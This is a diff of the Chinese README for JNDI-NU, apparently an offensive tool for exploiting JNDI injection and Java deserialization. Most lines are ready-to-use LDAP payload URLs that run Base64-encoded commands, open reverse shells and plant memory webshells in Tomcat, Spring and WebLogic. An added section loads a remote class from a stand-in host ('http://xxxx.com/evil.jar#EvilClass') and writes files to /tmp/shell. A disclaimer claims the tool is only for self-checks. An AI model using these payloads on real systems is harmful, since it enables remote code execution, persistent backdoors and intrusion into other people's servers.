@@ -1,17 +1,5 @@
 ![JNDI-NU](https://socialify.git.ci/nu1r/JNDI-NU/image?description=1&descriptionEditable=%E4%B8%80%E6%AC%BE%E7%94%A8%E4%BA%8E%20JNDI%E6%B3%A8%E5%85%A5%20%E5%88%A9%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%80%82%E7%94%A8%E4%BA%8E%E4%B8%8E%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8&font=KoHo&forks=1&language=1&logo=https%3A%2F%2Fs1.328888.xyz%2F2022%2F08%2F02%2FOESvy.png&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light)
 
-# 👮免责声明
-
-该工具仅用于安全自查检测
-
-由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
-
-本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。
-
-# 👾下载
-
-[下载点此处](https://github.com/nu1r/JNDI-NU/releases)
-
 # 😈使用说明
 
 使用 ```java -jar JNDI-NU.jar -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数
@@ -62,7 +50,6 @@ Supported LADP Queries：
 [+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
-    
     ldap://0.0.0.0:1389/Deserialization/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK3/Command/Base64/[base64_encoded_cmd]
@@ -78,10 +65,8 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections7Lite_4/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/C3P092/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/Click1/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/AspectJWeaver/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3183/Command/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/BeanShell1/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2NOCC/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils3/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1183NOCC/Command/Base64/[base64_encoded_cmd]
@@ -97,7 +82,6 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/JRMPClient_Activator/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/JRMPClient_Obj/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/JRMPListener/Command/Base64/[base64_encoded_cmd]
-    
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
     ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho
@@ -147,9 +131,9 @@ Supported LADP Queries：
   * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
   * ```Command```: 用于执行命令，如果命令有特殊字符，支持对命令进行 ```Base64编码```后传输
   * ```ReverseShell```: 用于 ```Linux``` 系统的反弹shell，方便使用
-  * ```Bypass```: 用于rmi命令执行，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
+  * ```Bypass```: 用于rmi本地工程类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
   * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
-  * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
+  * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
   * ```WeblogicEcho```: 用于在中间件为 ```Weblogic``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
 * 内存马已适配冰蝎4.0,AES加密, 添加后访问```/nu1r```即可, 暂时只写了冰蝎4的shell
   - 前提条件：Referer: https://nu1r.cn/
@@ -174,7 +158,7 @@ Supported LADP Queries：
     * ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
     * ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
     * ```WSFilter```: `CMD` 命令回显 WebSocket 内存马
-    * ```TomcatExecutor``` :`CMD` 命令回显 Executor 内存马
+    * ```TomcatExecutor``` : Executor 内存马，通过添加自定义```header``` ```nu1r: d2hvYW1p``` 的方式传递想要执行的命令，命令要进行Base64编码，需要Tomcat版本8.5+，因为tomcat8.5.0以后，在tomcat封装的socket⽀持unread的数据回写
 * 目前支持的所有 ```GadgetType``` 为
   * ```URLDNS```
   * ```CommonsBeanutils1```  
@@ -217,15 +201,11 @@ Supported LADP Queries：
   * ```JRMPClient_Activator```
   * ```JRMPClient_Obj```
   * ```JRMPListener```
-  
 * ```WebsphereBypass``` 中的 3 个动作：
   * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
   * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
   * ```rce```：加载已上传至目标服务器临时目录的```jar包```，从而达到远程代码执行的效果（这一步本地未复现成功，抛```java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.```异常，有复现成功的小伙伴麻烦指导下）
 
-# 🥎```内存shell```说明
-* 采用动态添加 ```Filter/Controller```的方式，并将添加的```Filter```移动至```FilterChain```的第一位
-* ```内存shell``` 的兼容性测试结果请参考 [memshell](https://github.com/feihong-cs/memShell) 项目
 * ```Basic cmd shell``` 的访问方式为 ```/anything?type=basic&pass=[cmd]```
 
 
@@ -260,13 +240,50 @@ jndiNu = func(Payload) {
 
 ---
 
+# 其他利用链的拓展
+
+对于 `BeanShell1` 及 `Clojure` 这两个基于脚本语言解析的漏利用方式。
+
+本项目为这两条利用链拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：
+
+`Base64/`后的内容需要base64编码
+
+TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10
+```
+ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/TS-10
+```
+
+RC ：Remote Call - 通过 URLClassLoader.loadClass() 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
+```
+ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/RC-http://xxxx.com/evil.jar#EvilClass
+```
+
+WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#123
+```
+ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/WF-/tmp/shell#123
+```
+
+其他：普通命令执行 - 通过 ProcessBuilder().start() 执行系统命令，使用命令 whoami
+```
+ldap://0.0.0.0:1389/Deserialization/Clojure/Command/Base64/whoami
+```
+
+---
+
 # 🏓TODO
 
 1. 本地ClassPath反序列化漏洞利用方式
 2. 支持自定义内存马密码
-3. 内存马模块改一下
 
 ---
+
+# 👮免责声明
+
+该工具仅用于安全自查检测
+
+由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
+
+本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。
 
 # 🐲建议
 不推荐用高版本JDK
